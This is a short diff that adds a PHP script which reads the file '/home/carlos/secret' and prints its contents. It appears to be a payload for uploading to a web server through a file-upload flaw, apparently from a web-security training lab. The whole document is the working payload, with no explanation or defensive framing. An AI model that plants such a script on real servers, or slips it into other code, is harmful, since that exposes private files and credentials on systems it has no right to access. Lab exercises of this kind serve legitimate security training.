@@ -1,0 +1,5 @@
+<?php
+    $file = '/home/carlos/secret'; // Specify the path to your file here
+    $content = file_get_contents($file);
+    echo $content;
+?>
